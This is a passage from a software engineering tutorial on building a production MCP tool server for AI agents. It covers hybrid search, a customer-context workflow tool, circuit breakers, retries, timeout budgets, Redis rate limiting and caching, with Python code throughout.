        es_task = asyncio.create_task(
            self.es_tool.run(
                tenant,
                ElasticsearchSearchInput(
                    index=args.es_index,
                    query={"multi_match": {"query": args.query, "fields": ["title^2", "body"]}},
                    size=args.top_k * 2,
                ),
            )
        )

        emb_task = asyncio.create_task(self.embedder.embed([args.query]))
        es_result, embeddings = await asyncio.gather(es_task, emb_task)
```

The **lexical and embedding calls run concurrently** using `asyncio.gather`. This matters for latency, embedding takes ~300ms and Elasticsearch takes ~200ms, running them sequentially would cost 500ms while running them in parallel costs ~300ms.

Then the RRF fusion:

```c
vs_result = await self.vector_tool.run(
            tenant,
            VectorSearchInput(
                collection=args.vector_collection, vector=embeddings[0], top_k=args.top_k * 2
            ),
        )

        # Build (id → rank) maps.
        lexical_ranks = {hit["id"]: rank for rank, hit in enumerate(es_result["hits"], start=1)}
        dense_ranks = {str(m["id"]): rank for rank, m in enumerate(vs_result["matches"], start=1)}

        # Fuse with RRF.
        all_ids = set(lexical_ranks) | set(dense_ranks)
        scored: list[tuple[str, float]] = []

        for doc_id in all_ids:
            score = 0.0
            if doc_id in lexical_ranks:
                score += 1.0 / (args.rrf_k + lexical_ranks[doc_id])
            if doc_id in dense_ranks:
                score += 1.0 / (args.rrf_k + dense_ranks[doc_id])
            scored.append((doc_id, score))

        scored.sort(key=lambda x: x[1], reverse=True)
```

Reciprocal Rank Fusion is the classic formula: `score = 1 / (k + rank)` per retriever, summed across retrievers. `k=60` is the canonical default from the original paper.

> Documents that rank high in either retriever (or both) bubble to the top.

This consistently beats either retriever alone on enterprise knowledge bases because BM25 wins on technical jargon and dense wins on natural language.

### Workflow Tools

Finally, **workflow tools**, Level 3. These wrap a multi-step procedure behind one name. The canonical example is the customer context tool in `src/atlas_mcp/tools/workflow/customer_context.py`:

![](https://miro.medium.com/v2/resize:fit:4800/format:webp/1*qmbDKytk5pQPBNNy7lk94g.png)

Workflow tools (Created by Fareed Khan )

```c
"""Workflow tool, customer.build_context.

A Level-3 tool: an agent-facing workflow that fans out to multiple atomic
tools concurrently, aggregates the results, and returns a single coherent
customer context document.
This is the tool a support-copilot agent calls first when a new ticket
comes in. It captures the deterministic portion of "look up everything
relevant" so the LLM does not have to construct that plan from scratch
on every ticket.
"""

class CustomerContextInput(BaseModel):
    customer_id: str = Field(..., pattern=r"^[A-Za-z0-9\-_]{1,64}$")
    question: str = Field(..., min_length=1, max_length=2000,
                          description="The support question being asked.")
    include_orders: bool = True
    include_tickets: bool = True
    include_docs: bool = True
    recent_orders_limit: int = Field(5, ge=1, le=20)

class CustomerContextTool(Tool):
    meta: ClassVar[ToolMetadata] = ToolMetadata(
        name="customer.build_context",
        description=(
            "Aggregate a customer's recent orders, open tickets, and relevant "
            "documentation passages for the given question. Returns a single "
            "structured context object."
        ),
        level=ToolLevel.WORKFLOW,
        scopes_required=(
            "tool:postgres:read",
            "tool:elasticsearch:read",
            "tool:vector:read",
        ),
        cacheable=True,
        cache_ttl_seconds=30,
        timeout_ms=15_000,
        tags=("support", "context", "workflow"),
    )
    input_schema: ClassVar[type[BaseModel]] = CustomerContextInput
```

Notice the `customer_id` field has a regex `pattern=r"^[A-Za-z0-9\-_]{1,64}$"`. This prevents an agent from accidentally (or adversarially) injecting SQL or path traversal characters into a customer id. Tight input validation is especially important for workflow tools because they fan out to multiple downstream systems.

The run method **fans out concurrently**:

```c
async def run(self, tenant: str, args: CustomerContextInput) -> dict:
        # Build the list of sub-tasks conditionally.
        tasks: dict[str, asyncio.Task] = {}

        # Identity, always fetched.
        tasks["profile"] = asyncio.create_task(self._profile(tenant, args.customer_id))
        if args.include_orders:
            tasks["orders"] = asyncio.create_task(
                self._recent_orders(tenant, args.customer_id, args.recent_orders_limit)
            )
        if args.include_tickets:
            tasks["tickets"] = asyncio.create_task(
                self._open_tickets(tenant, args.customer_id)
            )
        if args.include_docs:
            tasks["docs"] = asyncio.create_task(
                self._relevant_docs(tenant, args.question)
            )

        # Gather with return_exceptions, a partial context is better than none.
        results = await asyncio.gather(*tasks.values(), return_exceptions=True)
        keyed = dict(zip(tasks.keys(), results))

        # Separate successes from errors so the agent can see what failed.
        context: dict[str, Any] = {"customer_id": args.customer_id, "question": args.question}
        errors: dict[str, str] = {}

        for key, value in keyed.items():
            if isinstance(value, ToolError):
                errors[key] = value.code
            elif isinstance(value, Exception):
                errors[key] = f"internal_error: {type(value).__name__}"
            else:
                context[key] = value

        if errors:
            context["partial_errors"] = errors

        return context
```

Three important design choices.

1. First, we kick off **four independent sub-queries in parallel** (profile, orders, tickets, docs). On a typical support ticket, this cuts total latency from ~2 seconds sequential to ~500 ms parallel.
2. Second, `return_exceptions=True` means a failure in one sub-query does not kill the others. If Elasticsearch is down, we still return the profile and orders from Postgres. **Partial context is better than no context**, because the agent can work with what it has and the `partial_errors` field tells it what is missing.
3. Third, we separate successes from errors into two fields in the response. Successful data lives under its key (`profile`, `orders`, `tickets`, `docs`) and failures surface under `partial_errors` with their error codes. The agent sees both and can make informed decisions.

## Reliability Layer

We have tools that work. Now we need tools that **keep working** under adverse conditions.

In production, backends fail. Postgres primaries flip. Elasticsearch nodes go into yellow state. OpenAI rate-limits you.

> A naive MCP server that just forwards these failures to the agent will see agents spiral into retry storms that make the problem worse.

The reliability layer is three things working together:

![](https://miro.medium.com/v2/resize:fit:2000/format:webp/1*rjIJxzUpMhJ9BGffTczvLA.png)

Reliability Layer (Created by Fareed Khan )

1. **Circuit breaker** stops the cascade when one backend dies.
2. **Retry with backoff** handles transient blips without user impact.
3. **Adaptive Timeout Budget Allocation (ATBA)** bounds total agent-turn latency even when many tools get chained.

### Circuit Breaker State Machine

The classic circuit breaker pattern has three states: `CLOSED` (requests flow normally), `OPEN` (requests short-circuit with an error), and `HALF_OPEN` (one probe request is allowed to test recovery).

![](https://miro.medium.com/v2/resize:fit:2000/format:webp/1*C3NfDK_XCuQPxVmWYtEDBg.png)

Circuit Breaker State Machine (Created by Fareed Khan )

Create `src/atlas_mcp/reliability/circuit_breaker.py`:

```c
"""Component 7, Circuit breaker.

An async circuit breaker, one per tool, with the classic three-state machine:
* CLOSED, requests flow, failures are counted in a sliding window.
* OPEN, requests short-circuit immediately with CircuitOpenError
  for recovery_seconds.
* HALF_OPEN, one probe request is allowed through. Success closes the
  breaker; failure re-opens it for another recovery window.

The breaker counts *only* retryable / transient upstream failures. A
deterministic error (bad SQL, 404) should not open a breaker because the same
call will keep failing; that is what the UpstreamError.retryable
flag in Component 10 is for.
"""

from __future__ import annotations
import asyncio
import time

from collections import deque

from enum import Enum
from typing import Any, Awaitable, Callable

from atlas_mcp.config import ServerSettings
from atlas_mcp.errors.framework import CircuitOpenError, ToolError, UpstreamError

class State(str, Enum):
    CLOSED = "closed"
    OPEN = "open"
    HALF_OPEN = "half_open"
```

The critical insight in this module is the comment: **“The breaker counts only retryable upstream failures”**. A bad SQL query is not a reason to open the circuit. The next query might be perfectly valid. But a Postgres connection timeout is a reason to open the circuit because the next query will likely also time out.

This is where our SERF framework pays off. The `UpstreamError.retryable` flag that we set back in the Postgres tool decides whether each failure counts toward tripping the breaker.

The breaker class itself:

```c
class CircuitBreaker:
    def __init__(
        self,
        name: str,
        failure_threshold: int,
        recovery_seconds: int,
        window_seconds: int = 60,
    ):
        self.name = name
        self.failure_threshold = failure_threshold
        self.recovery_seconds = recovery_seconds
        self.window_seconds = window_seconds

        self._state: State = State.CLOSED
        self._opened_at: float = 0.0
        self._failures: deque[float] = deque()
        self._half_open_probe_in_flight = False
        self._lock = asyncio.Lock()
```

`_failures` is a deque of timestamps, so we can expire old failures that fall outside the sliding window. `_half_open_probe_in_flight` ensures only one probe runs at a time in HALF\_OPEN state, because we do not want to flood a recovering backend.

The `call` method is the single entry point:

```c
async def call(self, fn: Callable[..., Awaitable[Any]], *args, **kwargs) -> Any:
        await self._check_transitions()

        if self._state is State.OPEN:
            raise CircuitOpenError(tool=self.name, recovery_seconds=self.recovery_seconds)

        if self._state is State.HALF_OPEN:
            async with self._lock:

                if self._half_open_probe_in_flight:
                    # Only one probe at a time; subsequent callers short-circuit.
                    raise CircuitOpenError(tool=self.name, recovery_seconds=self.recovery_seconds)
                self._half_open_probe_in_flight = True

            try:
                result = await fn(*args, **kwargs)
                await self._on_success()
                return result
            except ToolError as exc:
                await self._on_failure(exc)
                raise

            finally:
                async with self._lock:
                    self._half_open_probe_in_flight = False
        # CLOSED
        try:
            return await fn(*args, **kwargs)
        except ToolError as exc:
            await self._on_failure(exc)
            raise
```

The flow:

1. Check if we should transition state (OPEN → HALF\_OPEN after recovery timeout).
2. If OPEN, short-circuit immediately without calling the backend.
3. If HALF\_OPEN, allow one probe. If another caller arrives while the probe is in flight, short-circuit them too.
4. If CLOSED, just call the function and count failures.

The state transitions:

```c
async def _check_transitions(self) -> None:
        now = time.monotonic()

        # OPEN → HALF_OPEN once the recovery window elapses.
        if self._state is State.OPEN and now - self._opened_at >= self.recovery_seconds:
            async with self._lock:
                if self._state is State.OPEN:
                    self._state = State.HALF_OPEN
                    self._half_open_probe_in_flight = False

        # Evict failures older than the window.
        cutoff = now - self.window_seconds

        while self._failures and self._failures[0] < cutoff:
            self._failures.popleft()

async def _on_failure(self, exc: ToolError) -> None:

        # Only open on genuinely transient upstream failures.
        if not (isinstance(exc, UpstreamError) and exc.retryable):
            return

        now = time.monotonic()

        async with self._lock:
            self._failures.append(now)

            if self._state is State.HALF_OPEN:
                # Probe failed, re-open immediately.
                self._state = State.OPEN
                self._opened_at = now
                self._failures.clear()
                return

            if len(self._failures) >= self.failure_threshold:
                self._state = State.OPEN
                self._opened_at = now
                self._failures.clear()

    async def _on_success(self) -> None:
        async with self._lock:
            if self._state is State.HALF_OPEN:
                self._state = State.CLOSED
                self._failures.clear()
```

The `_on_failure` guard `if not (isinstance(exc, UpstreamError) and exc.retryable): return` is doing real work. If an agent sends bad SQL a hundred times in a minute, the circuit does not open because those are `ValidationError` s, not `UpstreamError` s. Only genuine backend problems (timeouts, 503s, connection losses) count.

In HALF\_OPEN, any failure immediately re-opens the breaker. This is called **fast re-opening**, and it prevents us from wasting requests on a backend that is still flaky.

And the registry that holds one breaker per tool:

```c
class CircuitBreakerRegistry:
    """One breaker per tool, tools fail independently."""

    def __init__(self, settings: ServerSettings):
        self.settings = settings
        self._breakers: dict[str, CircuitBreaker] = {}

    def for_tool(self, tool_name: str) -> CircuitBreaker:

        if tool_name not in self._breakers:
            self._breakers[tool_name] = CircuitBreaker(
                name=tool_name,
                failure_threshold=self.settings.circuit_breaker_failure_threshold,
                recovery_seconds=self.settings.circuit_breaker_recovery_seconds,
            )

        return self._breakers[tool_name]
```

**One breaker per tool** is the right isolation level. If Elasticsearch is down, `elasticsearch.search` breaker opens, but `postgres.query` stays healthy. Agents can still get the profile and orders from Postgres while Elasticsearch recovers.

### Retry with Exponential Backoff & Jitter

The circuit breaker decides “should I call this tool”. Retry decides “if my call fails, should I try again”.

![](https://miro.medium.com/v2/resize:fit:4470/format:webp/1*ayhcuEDo8WzonswXgmQKhg.png)

Exponential Backoff (Created by Fareed Khan )

Create `src/atlas_mcp/reliability/retry.py`:

```c
"""Component 7, Retry policy.

Only retryable errors get retried. A retryable error is one whose
ToolError.retryable attribute is True, rate limits, 5xx, timeouts,
circuit probes. Everything else fails fast so the agent can adapt.
"""

from __future__ import annotations
import asyncio
import random
from typing import Any, Awaitable, Callable
from atlas_mcp.errors.framework import ToolError

async def with_retry(
    fn: Callable[..., Awaitable[Any]],
    *args,
    max_attempts: int = 3,
    base_delay_ms: int = 100,
    max_delay_ms: int = 2_000,
    deadline_s: float | None = None,
    **kwargs,
) -> Any:

    """Call fn with capped exponential backoff and jitter."""
    last_exc: Exception | None = None

    for attempt in range(1, max_attempts + 1):
        try:
            return await fn(*args, **kwargs)
        except ToolError as exc:
            last_exc = exc
            if not exc.retryable or attempt == max_attempts:
                raise
            delay = _backoff(attempt, base_delay_ms, max_delay_ms)
            if deadline_s is not None:
                remaining = deadline_s - asyncio.get_event_loop().time()
                if remaining <= delay:
                    raise
            await asyncio.sleep(delay)

    assert last_exc is not None
    raise last_exc

def _backoff(attempt: int, base_ms: int, max_ms: int) -> float:
    """Full-jitter backoff: delay = random(0, min(max, base*2^attempt))."""

    cap = min(max_ms, base_ms * (2 ** (attempt - 1)))
    return random.uniform(0, cap) / 1000.0
```

Three design choices worth calling out.

1. First, we only retry `ToolError` s with `retryable=True`. This is again the SERF framework doing its job. A `ValidationError` (bad SQL) is never retried because the same SQL will fail the same way.
2. Second, `_backoff` uses **full jitter**. The delay is `random.uniform(0, cap)`, not `cap`. This is the AWS-recommended pattern because it prevents the **thundering herd problem**, where N retrying clients all wake up at the same moment and hammer the backend. With full jitter, retries spread out naturally.
3. Third, the `deadline_s` parameter integrates with ATBA. If we only have 500ms left in the total budget and the next retry would sleep for 1 second, we **give up immediately** rather than retry past the deadline. We will see ATBA set these deadlines next.

### Adaptive Timeout Budget Allocation

**This is the most production-shaped component of the reliability layer.**

The problem: an agent that chains five tools with a 10-second timeout on each can block for 50 seconds before giving up. That is fine in isolation. It is a disaster inside a user-facing chat, where the user expects a response within 5–10 seconds.

> The solution is **ATBA**: allocate a *total* budget for the entire agent turn, and spend it across tool calls proportional to their observed p95 latency.

![](https://miro.medium.com/v2/resize:fit:4800/format:webp/1*VbDrJkAK4HZgXjyLzFb5Ig.png)

Adaptive Timeout Budget (Created by Fareed Khan )

Create `src/atlas_mcp/reliability/atba.py`:

```c
"""Component 7, Adaptive Timeout Budget Allocation.

The idea: the server tracks p95 latency per tool, and each tool call's timeout
is set to max(p95 * safety, remaining_budget / calls_left). Guarantees bounded
end-to-end latency even when an agent chains many calls.
"""

from __future__ import annotations

import asyncio
import contextvars

import time

from collections import defaultdict, deque
from dataclasses import dataclass

@dataclass
class BudgetContext:
    """Lifespan of a single agent request's time budget."""
    total_budget_s: float
    started_at: float
    calls_made: int = 0
    spent_s: float = 0.0

    @property
    def remaining_s(self) -> float:
        return max(0.0, self.total_budget_s - (time.monotonic() - self.started_at))

_current_budget: contextvars.ContextVar[BudgetContext | None] = contextvars.ContextVar(
    "atlas_budget", default=None
)
```

The `BudgetContext` tracks the total budget, when it started, and how many calls and seconds have been spent. `remaining_s` computes what is left.

We use `contextvars` to store the budget so it automatically propagates through async code. Every tool call inside the same agent turn reads the same `BudgetContext`, without us having to pass it explicitly through every function.

Next, the latency tracker that learns from history:

```c
class LatencyTracker:
    """Keeps a rolling window of per-tool durations for p95 estimation."""

    def __init__(self, window: int = 500):
        self.window = window
        self._samples: dict[str, deque[float]] = defaultdict(lambda: deque(maxlen=window))

    def record(self, tool: str, duration_s: float) -> None:
        self._samples[tool].append(duration_s)

    def p95(self, tool: str, default_s: float = 5.0) -> float:
        samples = self._samples.get(tool)

        if not samples or len(samples) < 20:
            return default_s

        sorted_samples = sorted(samples)

        idx = int(len(sorted_samples) * 0.95)

        return sorted_samples[min(idx, len(sorted_samples) - 1)]
```

Each tool gets a rolling window of the last 500 call durations. `p95` returns the 95th percentile of that window, which is a much better estimate of "expected worst case" than a mean. If we have fewer than 20 samples, we return a conservative default of 5 seconds.

Now the allocator:

```c
class ATBA:
    """Allocates tool-call timeouts from a shared budget."""

    SAFETY_FACTOR = 1.5  # allow 50% headroom over p95
    MIN_CALL_TIMEOUT_S = 0.5
    EXPECTED_CALLS_PER_TURN = 5

    def __init__(self, total_budget_ms: int):
        self.total_budget_s = total_budget_ms / 1000.0
        self.tracker = LatencyTracker()

    def begin(self) -> BudgetContext:
        ctx = BudgetContext(
            total_budget_s=self.total_budget_s, started_at=time.monotonic()
        )
        _current_budget.set(ctx)
        return ctx

    def timeout_for(self, tool: str) -> float:
        """Compute a per-call timeout given current budget + historical latency."""

        ctx = _current_budget.get()
        p95 = self.tracker.p95(tool)
        target = p95 * self.SAFETY_FACTOR

        if ctx is None:
            return max(self.MIN_CALL_TIMEOUT_S, target)
        remaining = ctx.remaining_s

        # Estimate how many calls are likely still to come.
        calls_left = max(1, self.EXPECTED_CALLS_PER_TURN - ctx.calls_made)
        fair_share = remaining / calls_left

        # Take the smaller of "fair share of remaining budget" and "p95 * safety".
        return max(self.MIN_CALL_TIMEOUT_S, min(target, fair_share))
```

The `timeout_for` logic is the clever part.

1. Compute `target = p95 * 1.5`, which is "what we expect this call to need with some headroom".
2. Compute `fair_share = remaining_budget / calls_left`, which is "how much time we can afford per remaining call".
3. Take the **smaller** of the two.

If the tool is fast and the budget is plentiful, we use `p95 * 1.5`, not wasting budget. If the budget is almost gone, we shrink to `fair_share`, protecting the overall SLA. A floor of 0.5 seconds prevents us from handing out microsecond timeouts.

Then the execution wrapper:

```c
async def call_with_budget(self, tool: str, coro) -> any:
        """Run coro under the per-call timeout derived from the budget."""
        timeout = self.timeout_for(tool)
        ctx = _current_budget.get()

        if ctx is not None:
            ctx.calls_made += 1

        started = time.monotonic()

        try:
            return await asyncio.wait_for(coro, timeout=timeout)
        finally:
            duration = time.monotonic() - started
            self.tracker.record(tool, duration)
            if ctx is not None:
                ctx.spent_s += duration
```

Every tool call goes through this. We compute the per-call timeout, run the coroutine with `asyncio.wait_for`, record the actual duration to update p95, and track the calls made.

1. **This is what makes agents affordable at scale**. Without ATBA, a user asking a simple question could trigger an agent that chains 10 tools with 10-second timeouts, consuming 100 seconds of budget.
2. With ATBA, the same agent gets cut off at 30 seconds total (the `ATLAS_ATBA_TOTAL_BUDGET_MS` we set in section 1), and individual tools get proportional slices.

So far, we have a reliability layer with three components working together: circuit breakers that stop cascading failures per tool, exponential-backoff retries with full jitter that handle transient blips, and an ATBA allocator that caps total agent-turn latency and adapts timeouts to observed backend performance.

## Rate Limiting & Caching

We have reliability. Now we need to protect ourselves from two different problems that agents cause at scale: **burst traffic** and **redundant work**.

Burst traffic is what happens when an agent goes into a tight loop. A prompt misstep that makes the LLM think it should call `semantic_search` 50 times in a row is a real thing that happens, and without rate limiting it will drain your OpenAI budget and your vector DB's capacity in seconds.

![](https://miro.medium.com/v2/resize:fit:2000/format:webp/1*CvfLYyppMTLyU9UalfHmyA.png)

Rate Limit Check (Created by Fareed Khan )

Redundant work is what happens when ten support agents on ten different tickets all call `customer.build_context` for the same customer within the same minute. Without caching, you pay for that lookup ten times.

We are going to solve both with **Redis**: a token bucket for rate limiting, and a two-tier cache for results.

### Redis Token Bucket via Lua Script

Normally, the beginner approach to rate limiting is an in-process counter. That works for one replica.

> The moment you scale horizontally behind a load balancer, an agent can N-x its quota by getting round-robined across N replicas.

![](https://miro.medium.com/v2/resize:fit:4800/format:webp/1*VWgYBDHoiEAcyMRWuJR_3w.png)

Redis Token Bucket (Created by Fareed Khan )

The in-process counter on each replica has no idea there is another replica also letting the agent through.

The production approach is **Redis as the shared source of truth**. But you have to be careful, because a naive **“read counter, check, increment”** pattern has a race condition: two requests can read the same value, both decide they are under the limit, both increment, and suddenly the counter is over limit.

The solution is an atomic **Lua script**. Redis executes Lua scripts as a single atomic operation, so check-and-consume cannot be raced.

Create `src/atlas_mcp/ratelimit/limiter.py`:

```c
"""Component 8, Rate Limiting & Quotas.

A Redis-backed token bucket with atomic refill. Keyed on
(tenant, tool) so noisy agents cannot starve other tenants and runaway
loops on one tool cannot starve calls to another.

Why Redis: the server is horizontally scaled. An in-process limiter on each
replica would let an agent N-x its quota by getting load-balanced across N
replicas. Redis is the shared truth.

Why token bucket over leaky bucket or fixed window: it permits bursts
naturally, which is how agents actually behave, a burst of six tool calls
while planning, then quiet while reasoning.

The refill logic is a single Lua script so check-and-consume is atomic.
"""

from __future__ import annotations
import time
from dataclasses import dataclass
from redis.asyncio import Redis
from atlas_mcp.config import ServerSettings
from atlas_mcp.errors.framework import RateLimitError
```

Why token bucket and not leaky bucket or fixed window? Because agents are bursty by nature. An agent doing planning might make 6 tool calls in 2 seconds, then sit quiet for 30 seconds while the LLM thinks. A fixed-window limiter would either reject the burst (bad) or over-allocate to accommodate it (also bad). Token bucket lets the burst through if tokens are available, and refills steadily.

Now the Lua script itself:

```c
# Lua script: atomic token-bucket refill + consume.

# Returns {allowed, retry_after_ms, tokens_remaining}
_LUA_SCRIPT = """
local key         = KEYS[1]
local capacity    = tonumber(ARGV[1])
local refill_per_s= tonumber(ARGV[2])
local now_ms      = tonumber(ARGV[3])
local cost        = tonumber(ARGV[4])

local bucket = redis.call('HMGET', key, 'tokens', 'last_ms')
local tokens  = tonumber(bucket[1]) or capacity
local last_ms = tonumber(bucket[2]) or now_ms

-- Refill based on elapsed time.
local elapsed_s = math.max(0, (now_ms - last_ms) / 1000.0)
tokens = math.min(capacity, tokens + elapsed_s * refill_per_s)
local allowed = 0
local retry_after_ms = 0

if tokens >= cost then
  tokens = tokens - cost
  allowed = 1
else
  local deficit = cost - tokens
  retry_after_ms = math.ceil((deficit / refill_per_s) * 1000)
end

redis.call('HMSET', key, 'tokens', tokens, 'last_ms', now_ms)
redis.call('EXPIRE', key, 3600)
return {allowed, retry_after_ms, tokens}
"""
```

Let’s understand what this script does.

1. We read the bucket’s current token count and the timestamp of the last refill.
2. We compute how many tokens to add based on elapsed time, capped at `capacity` so an idle bucket does not overflow.
3. If there are enough tokens for the cost, we consume them and return `allowed=1`.
4. If not, we compute how long the caller must wait until enough tokens refill, and return `allowed=0` with `retry_after_ms`.
5. We write the new bucket state back atomically.

The `EXPIRE` gives the key a 1-hour TTL. If a tenant-tool pair goes idle, the bucket disappears and the next call starts fresh with a full bucket. This is important because Redis would otherwise fill up with millions of idle buckets.

Now the quota dataclass and the limiter class:

```c
@dataclass(frozen=True, slots=True)
class Quota:
    capacity: int        # Maximum tokens in the bucket.
    refill_per_minute: int  # How many tokens are replenished per minute.

class RateLimiter:
    """Per-(tenant, tool) Redis token bucket."""
    def __init__(self, settings: ServerSettings):
        self.settings = settings
        self._redis: Redis | None = None
        self._script_sha: str | None = None

        # Default quota, overridden per-tool below.
        self._default = Quota(
            capacity=settings.rate_limit_burst,
            refill_per_minute=settings.rate_limit_default_rpm,
        )

        # Per-tool overrides. Extend this table as you add expensive tools.
        self._overrides: dict[str, Quota] = {

            # Expensive workflow tools get tighter quotas.
            "research.topic": Quota(capacity=3, refill_per_minute=10),
            "semantic_search": Quota(capacity=30, refill_per_minute=120),
        }
```

Notice the **per-tool overrides**. `research.topic` is a hypothetical expensive workflow tool that might cost dollars per call, so it gets a tight 3-capacity, 10-per-minute quota. `semantic_search` is cheaper but still costs an embedding call, so it gets 30 capacity and 120 per minute. Tools without explicit overrides fall back to the default.

The connection and script loading:

```c
async def connect(self) -> None:
        self._redis = Redis.from_url(self.settings.redis_url, decode_responses=True)
        self._script_sha = await self._redis.script_load(_LUA_SCRIPT)

async def disconnect(self) -> None:
        if self._redis is not None:
            await self._redis.close()
            self._redis = None

    def quota_for(self, tool: str) -> Quota:
        return self._overrides.get(tool, self._default)
```

`script_load` uploads the Lua script to Redis once at startup and returns its SHA. On every call, we reference the script by SHA (which is fast) instead of sending the full script body over the wire.

Then the acquire method, this is what the dispatch pipeline calls:

```c
async def acquire(self, tenant: str, tool: str, cost: int = 1) -> None:
        """Consume cost tokens; raise RateLimitError on exhaustion."""
        assert self._redis is not None and self._script_sha is not None, "call connect() first"

        quota = self.quota_for(tool)
        refill_per_s = quota.refill_per_minute / 60.0
        key = f"atlas:rl:{tenant}:{tool}"

        now_ms = int(time.time() * 1000)

        allowed, retry_after_ms, _tokens = await self._redis.evalsha(
            self._script_sha,
            1,
            key,
            quota.capacity,
            refill_per_s,
            now_ms,
            cost,
        )

        if int(allowed) == 0:
            raise RateLimitError(retry_after_seconds=int(retry_after_ms) / 1000.0)
```

The key is `atlas:rl:{tenant}:{tool}`. This is important, we key on **both** tenant and tool, which means:

1. Noisy tenant A cannot starve quiet tenant B (tenant isolation).
2. A runaway loop on `postgres.query` cannot exhaust the quota for `semantic_search` (per-tool isolation).

When `allowed=0`, we raise our `RateLimitError` with the exact `retry_after_seconds` from the Lua script. The agent reads that value from the SERF payload and can back off the exact right amount.

### Two Tier Caching

Now caching. The pattern is **two tiers**: L1 in-process, L2 in Redis.

- L1 is an async-safe LRU in the server process. Sub-millisecond hits, invalidated on restart.
- L2 is in Redis, shared across replicas. ~1ms hits, survives deploys.

![](https://miro.medium.com/v2/resize:fit:4800/format:webp/1*iBOX4i6MuEQn3bTtAWrOcg.png)

Two-Tier Caching (Created by Fareed Khan )

Reads check L1, then L2, then miss and execute. Writes populate both tiers.

Create `src/atlas_mcp/cache/manager.py`. First the L1:

```c
"""Component 9, Caching Layer.

Two tiers:
* L1 (in-process): an async-safe, TTL-aware LRU. Sub-millisecond hits,
  invalidated by process restart. Good for very hot keys (list_tools,
  catalog lookups).
* L2 (Redis): shared across replicas. ~1 ms hits. Survives deploys.

Reads check L1 → L2 → miss. Writes populate both tiers (write-through).
"""

from __future__ import annotations
import asyncio
import json
import time

from collections import OrderedDict
from dataclasses import dataclass
from typing import Any

from redis.asyncio import Redis
from atlas_mcp.config import ServerSettings

@dataclass
class L1Entry:
    value: Any
    expires_at: float

class L1Cache:
    """Async-safe in-process LRU with per-entry TTL."""

    def __init__(self, max_items: int):
        self.max_items = max_items
        self._store: OrderedDict[str, L1Entry] = OrderedDict()
        self._lock = asyncio.Lock()

    async def get(self, key: str) -> Any | None:
        async with self._lock:
            entry = self._store.get(key)
            if entry is None:
                return None
            if entry.expires_at < time.monotonic():
                self._store.pop(key, None)
                return None

            # Move to end for LRU.
            self._store.move_to_end(key)
            return entry.value

    async def set(self, key: str, value: Any, ttl_seconds: int) -> None:
        async with self._lock:
            self._store[key] = L1Entry(value=value, expires_at=time.monotonic() + ttl_seconds)
            self._store.move_to_end(key)

            while len(self._store) > self.max_items:
                self._store.popitem(last=False)

    async def delete(self, key: str) -> None:
        async with self._lock:
            self._store.pop(key, None)
```

`OrderedDict` + `move_to_end` is the classic Python LRU trick. Reading a key moves it to the end (most recently used). When we are at capacity, `popitem(last=False)` evicts the oldest entry.

The `asyncio.Lock()` makes this async-safe. Without it, two concurrent coroutines could corrupt the OrderedDict. This is one of those subtle bugs that only surfaces under load.

Each entry carries its own `expires_at` timestamp, so we can expire lazily on read. No background sweeper needed.

Now the `CacheManager` that ties L1 + L2 together:

```c
class CacheManager:
    """Coordinates L1 + L2 with stampede locks."""

    STAMPEDE_LOCK_TTL_MS = 5_000
    STAMPEDE_WAIT_MS = 50

    def __init__(self, settings: ServerSettings):
        self.settings = settings
        self.l1 = L1Cache(max_items=settings.cache_l1_max_items)
        self._redis: Redis | None = None

    async def connect(self) -> None:
        self._redis = Redis.from_url(self.settings.redis_url, decode_responses=True)

    async def disconnect(self) -> None:
        if self._redis is not None:
            await self._redis.close()
            self._redis = None

    # ── Read path ─────────────────────────────────────────────────
    async def get(self, key: str) -> Any | None:

        # L1 hit?
        if (hit := await self.l1.get(key)) is not None:
            return hit

        # L2 hit?
        if self._redis is not None:
            raw = await self._redis.get(key)

            if raw is not None:
                value = json.loads(raw)
                # Populate L1 for next time.
                await self.l1.set(key, value, ttl_seconds=self.settings.cache_l1_ttl_seconds)
                return value
        return None
```

The read path uses the walrus operator `:=` to avoid double-reading. If L1 hits, we return immediately. If L1 misses but L2 hits, we **backfill L1** so the next hit is sub-millisecond.

The write path is write-through:

```c
async def set(self, key: str, value: Any, ttl: int | None = None) -> None:

        ttl_l2 = ttl or self.settings.cache_l2_ttl_seconds
        ttl_l1 = min(ttl_l2, self.settings.cache_l1_ttl_seconds)

        await self.l1.set(key, value, ttl_seconds=ttl_l1)

        if self._redis is not None:
            await self._redis.set(key, json.dumps(value, default=str), ex=ttl_l2)

async def delete(self, key: str) -> None:
        await self.l1.delete(key)

        if self._redis is not None:
            await self._redis.delete(key)
```

L1 TTL is always `min(l1_default, l2_ttl)`. This prevents L1 from serving stale data past L2's expiry.

### Stampede Prevention

Now the clever part. **Cache stampede** is what happens when a popular key expires and 100 concurrent requests all miss the cache at the same moment. Without protection, all 100 requests execute the expensive operation simultaneously, hammering the backend.

![](https://miro.medium.com/v2/resize:fit:4800/format:webp/1*NJsDNsxtyYDgM583g0HdAQ.png)

Stampede Prevention (Created by Fareed Khan )

The fix is **single-flight**: only one request does the work, the others wait and re-read:

```c
async def get_or_compute(self, key: str, compute, ttl: int | None = None) -> Any:
        """Read-through with single-flight semantics.

        compute is a zero-arg coroutine factory. Exactly one caller will
        invoke it on a miss; others wait briefly and re-read.
        """

        if (hit := await self.get(key)) is not None:
            return hit

        assert self._redis is not None, "cache not connected"
        lock_key = f"{key}:lock"

        # NX SET returns None if someone else holds the lock.
        got_lock = await self._redis.set(lock_key, "1", nx=True, px=self.STAMPEDE_LOCK_TTL_MS)

        if got_lock:
            try:
                value = await compute()
                await self.set(key, value, ttl=ttl)
                return value
            finally:
                await self._redis.delete(lock_key)

        # Someone else is computing, wait briefly, then re-read.
        for _ in range(20):  # up to ~1 s
            await asyncio.sleep(self.STAMPEDE_WAIT_MS / 1000)
            if (hit := await self.get(key)) is not None:
                return hit

        # Lock holder died or is slow, compute ourselves.
        value = await compute()

        await self.set(key, value, ttl=ttl)
        return value
```

The flow for the above function is this …

1. Check cache. If hit, return.
2. On miss, try to acquire a Redis lock with `NX` (set if not exists) and a 5-second TTL.
3. If we got the lock, we are the single worker. Compute, set, release.
4. If we did not get the lock, someone else is working. We wait in short 50ms increments, re-reading the cache.
5. After ~1 second of waiting, we give up on the other worker (maybe it crashed) and compute ourselves.

The `PX` (millisecond TTL) on the lock is critical. If the computing worker crashes mid-computation, the lock auto-expires after 5 seconds and another worker can take over. Without the TTL, a crashed worker would cause permanent blocking.

